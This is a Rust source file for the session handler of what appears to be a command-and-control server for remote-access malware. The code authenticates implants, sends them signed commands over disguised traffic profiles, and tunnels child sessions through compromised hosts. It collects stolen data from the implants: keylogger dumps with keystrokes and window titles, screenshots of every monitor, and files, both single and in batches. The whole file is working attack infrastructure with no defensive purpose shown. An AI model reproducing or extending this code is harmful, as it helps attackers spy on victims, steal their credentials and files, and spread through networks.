// src/server/session.rs
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, oneshot};
use std::net::SocketAddr;
use std::sync::atomic::{Ordering, AtomicU32};
use ed25519_dalek::{SigningKey, Signer};
use chrono::Utc;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::collections::HashMap;
use std::pin::Pin;
use std::future::Future;
use tracing::{info, warn, error};
use std::fs;
use std::path::Path;

use crate::common::{ClientHello, Session, SecuredCommand, CommandResponse, SharedSessions, PivotFrame, MalleableProfile};
use crate::database::{self, DbPool};
use crate::api::SharedResults;
use crate::file_transfer;
use crate::transport::{BoxedStream, C2Stream};
use crate::traffic::DataMolder;

static NEXT_ID: AtomicU32 = AtomicU32::new(1);

pub fn handle_connection(
    stream: BoxedStream,
    addr: SocketAddr,
    sessions: SharedSessions,
    db: DbPool,
    results: SharedResults,
    parent_id: Option<u32>
) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let (mut reader, mut writer) = tokio::io::split(stream);
        let mut virtual_sessions: HashMap<u32, mpsc::UnboundedSender<Vec<u8>>> = HashMap::new();

        // 1. Handshake: Detect Profile & Read Hello
        let (hello_buf, _) = match DataMolder::detect_and_recv(&mut reader).await {
            Ok(res) => res,
            Err(e) => {
                if e.kind() != std::io::ErrorKind::UnexpectedEof {
                    warn!("Handshake/Detection Error from {}: {}", addr, e);
                }
                return;
            }
        };
        
        let hello: ClientHello = match serde_json::from_slice(&hello_buf) {
            Ok(h) => h,
            Err(e) => { error!("JSON Error from {}: {}", addr, e); return; }
        };

        // 2. Authentication & Profile Loading
        let (signing_key, active_profile, profile_name) = {
            let conn = match db.get() {
                Ok(c) => c,
                Err(e) => { error!("DB Connection Failed: {}", e); return; }
            };
            
            match database::get_build_info(&conn, &hello.build_id) {
                Some((key_bytes, name, profile_json_opt)) => {
                    let key = match key_bytes.try_into() {
                        Ok(a) => SigningKey::from_bytes(&a),
                        Err(_) => { error!("Invalid Key in DB for {}", hello.build_id); return; }
                    };

                    let profile = if let Some(json) = profile_json_opt {
                        serde_json::from_str::<MalleableProfile>(&json).unwrap_or_else(|_| MalleableProfile::default())
                    } else {
                        MalleableProfile::default()
                    };

                    (key, profile, name)
                },
                None => { warn!("Unknown Build ID from {}: {}", addr, hello.build_id); return; },
            }
        };

        // 3. Register Session
        let sess_id = NEXT_ID.fetch_add(1, Ordering::Relaxed);
        {
            if let Ok(conn) = db.get() {
                database::log_new_session(
                    &conn, &hello.exe_id, &hello.computer_id, &hello.hostname, &hello.os,
                    &addr.ip().to_string(), &hello.build_id, &profile_name
                );
            }
        }
        
        let conn_type = if let Some(pid) = parent_id { format!("Tunneled via #{}", pid) } else { "Direct".to_string() };
        
        info!(session_id = sess_id, ip = %addr.ip(), profile = %profile_name, "Session Established");
        println!("\n[+] New Session {}: {} ({}) [{}] via {}", sess_id, addr.ip(), hello.build_id, conn_type, profile_name);

        let (tx, mut rx) = mpsc::unbounded_channel::<(String, Option<oneshot::Sender<u64>>)>();
        let (v_tx, mut v_rx) = mpsc::unbounded_channel::<(u32, Vec<u8>)>();
        
        sessions.lock().unwrap().insert(sess_id, Session {
            id: sess_id, computer_id: hello.computer_id, addr, hostname: hello.hostname,
            os: hello.os, tx, signing_key: signing_key.clone(), parent_id
        });

        let mut counter = 1u64;

        // 4. Main Loop
        loop {
            tokio::select! {
                // A. Send Command
                Some((cmd_txt, callback)) = rx.recv() => {
                    let mut cmd = SecuredCommand {
                        session_id: "sess".to_string(), counter, nonce: rand::random(),
                        timestamp: Utc::now(), command: cmd_txt.clone(), signature: String::new()
                    };
                    
                    let log_txt = cmd_txt.clone();
                    let db_inner = db.clone();
                    tokio::task::spawn_blocking(move || {
                        if let Ok(conn) = db_inner.get() {
                            database::log_command(&conn, sess_id, counter, &log_txt);
                        }
                    });

                    info!(session_id = sess_id, req_id = counter, "Sending Command");

                    let sig = signing_key.sign(&cmd.get_signable_bytes());
                    cmd.signature = BASE64.encode(sig.to_bytes());
                    
                    let j = match serde_json::to_vec(&cmd) {
                        Ok(data) => data,
                        Err(e) => {
                            error!("Serialization failure for session {}: {}", sess_id, e);
                            continue;
                        }
                    };
                    
                    if DataMolder::send(&mut writer, &j, &active_profile).await.is_err() { break; }
                    
                    if let Some(cb) = callback { let _ = cb.send(counter); }
                    counter += 1;
                }

                // B. Receive Data
                res = DataMolder::recv(&mut reader, &active_profile) => {
                    match res {
                        Ok(b) => {
                            if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&b) {
                                let child_id = frame.source;
                                if let Some(v_sender) = virtual_sessions.get(&child_id) {
                                    if !frame.data.is_empty() { let _ = v_sender.send(frame.data); }
                                } else {
                                    // New Pivot Logic
                                    let mut real_addr = addr;
                                    if !frame.metadata.is_empty() {
                                        if let Ok(parsed_ip) = frame.metadata.parse::<SocketAddr>() { real_addr = parsed_ip; }
                                    }
                                    info!(parent = sess_id, child = child_id, "New Pivot");
                                    println!("[+] New Pivot: Child #{} via #{}", child_id, sess_id);
                                    
                                    let (server_half, bridge_half) = tokio::io::duplex(4096);
                                    let (child_tx, mut child_rx) = mpsc::unbounded_channel::<Vec<u8>>();
                                    virtual_sessions.insert(child_id, child_tx.clone());
                                    
                                    if !frame.data.is_empty() { let _ = child_tx.send(frame.data); }
                                    let v_tx_clone = v_tx.clone();
                                    
                                    tokio::spawn(async move {
                                        let (mut b_read, mut b_write) = tokio::io::split(bridge_half);
                                        let mut buf = [0u8; 4096];
                                        loop {
                                            tokio::select! {
                                                n = b_read.read(&mut buf) => match n {
                                                    Ok(n) if n > 0 => { let _ = v_tx_clone.send((child_id, buf[..n].to_vec())); },
                                                    _ => break,
                                                },
                                                Some(d) = child_rx.recv() => { if b_write.write_all(&d).await.is_err() { break; } }
                                            }
                                        }
                                    });

                                    let (s_c, d_c, r_c) = (sessions.clone(), db.clone(), results.clone());
                                    tokio::spawn(async move {
                                        handle_connection(C2Stream::Virtual(server_half), real_addr, s_c, d_c, r_c, Some(sess_id)).await;
                                    });
                                }
                                continue;
                            }
                            if let Ok(r) = serde_json::from_slice::<CommandResponse>(&b) {
                                process_response(sess_id, r, &results, &db).await;
                            }
                        }
                        Err(_) => break,
                    }
                }
                
                // C. Pivot Write
                Some((target, data)) = v_rx.recv() => {
                    let frame = PivotFrame { stream_id: 0, destination: target, source: 0, data, metadata: String::new() };
                    if let Ok(j) = serde_json::to_vec(&frame) {
                        if DataMolder::send(&mut writer, &j, &active_profile).await.is_err() { break; }
                    }
                }
            }
        }
        sessions.lock().unwrap().remove(&sess_id);
        info!(session_id = sess_id, "Session Disconnected");
        println!("\n[-] Session {} disconnected.", sess_id);
    })
}

async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResults, db: &DbPool) {
    // --- KEYLOGGER DUMP HANDLING ---
    if r.output.starts_with("KEYLOG_DUMP:") {
        let content = r.output.trim_start_matches("KEYLOG_DUMP:");
        if content.trim().is_empty() { return; }

        let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
        let folder_name = format!("keylog_{}_{}", timestamp, sess_id);
        let base_path = Path::new("downloads").join(&folder_name);
        
        if let Err(e) = fs::create_dir_all(&base_path) {
            error!("Failed to create keylog directory: {}", e);
            return;
        }

        let mut processed_entries = Vec::new();
        let mut raw_keyboard_text = String::new();
        let lines = content.lines();

        for (index, line) in lines.enumerate() {
            if line.trim().is_empty() { continue; }
            if let Ok(mut entry) = serde_json::from_str::<serde_json::Value>(line) {
                // Raw Text
                if entry["type"] == "window_change" {
                    if let Some(title) = entry["data"]["title"].as_str() {
                        raw_keyboard_text.push_str(&format!("\n\n[Title: {}]\n", title));
                    }
                }
                if entry["type"] == "keystroke" {
                    if let Some(key) = entry["data"]["key"].as_str() {
                        raw_keyboard_text.push_str(key);
                    }
                }
                // Screenshot Extraction
                if entry["type"] == "screenshot" {
                    if let Some(b64_str) = entry["data"]["image_b64"].as_str() {
                        if let Ok(bytes) = BASE64.decode(b64_str) {
                            let kind = entry["data"]["kind"].as_str().unwrap_or("unknown");
                            let img_ts = entry["timestamp"].as_str().unwrap_or("0").replace(":", "-").replace(".", "_");
                            let img_filename = format!("{}_img_{}_{}.png", img_ts, index, kind);
                            let img_path = base_path.join(&img_filename);
                            
                            if fs::write(&img_path, bytes).is_ok() {
                                if let Some(obj) = entry["data"].as_object_mut() {
                                    obj.remove("image_b64");
                                    obj.insert("saved_file".to_string(), serde_json::json!(img_filename));
                                }
                            }
                        }
                    }
                }
                processed_entries.push(entry);
            }
        }

        let _ = fs::write(base_path.join("raw_keyboard.txt"), raw_keyboard_text);
        let _ = fs::write(base_path.join("session_log.json"), serde_json::to_string_pretty(&processed_entries).unwrap_or_default());

        let msg = format!("Keylogs extracted to: downloads/{}", folder_name);
        info!(sess_id, folder = %folder_name, "Keylogs Processed");
        println!("\n[+] {}", msg);
        
        let mut modified_response = r.clone();
        modified_response.output = msg;
        let log_output = modified_response.output.clone();
        let log_error = modified_response.error.clone();

        results.lock().unwrap().insert((sess_id, r.request_id), modified_response);
        let db_inner = db.clone();
        tokio::task::spawn_blocking(move || {
            if let Ok(conn) = db_inner.get() {
                database::save_client_output(&conn, sess_id, r.request_id, &log_output, &log_error);
            }
        });
        return;
    }

    // --- [NEW] SCREENSHOT DUMP HANDLING ---
    if r.output.starts_with("SCREENSHOT_DUMP:") {
        let content = r.output.trim_start_matches("SCREENSHOT_DUMP:");
        let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
        let folder_name = format!("screenshots_{}_{}", timestamp, sess_id);
        let base_path = Path::new("downloads").join(&folder_name);

        if fs::create_dir_all(&base_path).is_ok() {
            let mut count = 0;
            // Parse JSON Array
            if let Ok(entries) = serde_json::from_str::<Vec<serde_json::Value>>(content) {
                for entry in entries {
                    // Expect format from script: { "monitor_index": i, "b64": "..." }
                    if let (Some(idx), Some(b64)) = (entry["monitor_index"].as_u64(), entry["b64"].as_str()) {
                        if let Ok(bytes) = BASE64.decode(b64) {
                            let filename = format!("monitor_{}.png", idx);
                            if fs::write(base_path.join(&filename), bytes).is_ok() {
                                count += 1;
                            }
                        }
                    }
                }
            }

            let msg = format!("Saved {} screenshots to: downloads/{}", count, folder_name);
            println!("\n[+] {}", msg);

            // Update Response for DB/UI
            let mut modified_response = r.clone();
            modified_response.output = msg;
            let log_output = modified_response.output.clone();
            let log_error = modified_response.error.clone();

            results.lock().unwrap().insert((sess_id, r.request_id), modified_response);
            let db_inner = db.clone();
            tokio::task::spawn_blocking(move || {
                if let Ok(conn) = db_inner.get() {
                    database::save_client_output(&conn, sess_id, r.request_id, &log_output, &log_error);
                }
            });
            return;
        }
    }
    // -------------------------------------

    if r.output.starts_with("file:data|") {
        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
        if parts.len() == 4 {
            match file_transfer::save_download_with_metadata(sess_id, parts[1], parts[3], parts[2]) {
                Ok(m) => {
                    info!(sess_id, file = parts[1], "File Downloaded Successfully");
                    println!("\n[+] Single Download: {}", m);
                },
                Err(e) => {
                    error!(sess_id, file = parts[1], error = %e, "File Download Failed");
                    println!("\n[-] Save Error: {}", e);
                }
            }
        }
        return;
    } 
    
    if r.output.starts_with("file:data_batch|") {
        let parts: Vec<&str> = r.output.splitn(6, '|').collect();
        if parts.len() == 6 {
            let (batch_ts, root, rel, b64) = (parts[1], parts[2], parts[3], parts[5]);
            match file_transfer::save_batch_file(batch_ts, sess_id, root, rel, b64) {
                Ok(_) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("Downloaded: {}", rel)); },
                Err(e) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("FAILED: {} - {}", rel, e)); }
            }
        }
        return;
    }

    if r.output.starts_with("file:report_batch|") {
        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
        if parts.len() == 4 {
            let (batch_ts, root, json) = (parts[1], parts[2], parts[3]);
            match file_transfer::save_batch_report(batch_ts, sess_id, root, json) {
                Ok(path) => { 
                    info!(sess_id, batch = root, report = path, "Batch Download Complete");
                    println!("\n[+] Batch Complete: {}\n[+] Report: {}", root, path); 
                },
                Err(e) => println!("[-] Report Error: {}", e),
            }
        }
        return;
    }

    results.lock().unwrap().insert((sess_id, r.request_id), r.clone());

    let db_inner = db.clone();
    let r_clone = r.clone();
    tokio::task::spawn_blocking(move || {
        if let Ok(conn) = db_inner.get() {
            database::save_client_output(&conn, sess_id, r_clone.request_id, &r_clone.output, &r_clone.error);
        }
    });

    if !r.error.is_empty() {
        error!(sess_id, req_id = r.request_id, exit_code = r.exit_code, error = %r.error, "Command Failed");
        println!("\n[-] Session {} Error (Exit {}): {}", sess_id, r.exit_code, r.error);
    } else if !r.output.trim().is_empty() {
        info!(sess_id, req_id = r.request_id, output = %r.output.trim(), "Command Output Received");
        println!("\n[Sess {} Output]\n{}", sess_id, r.output.trim());
    }
}
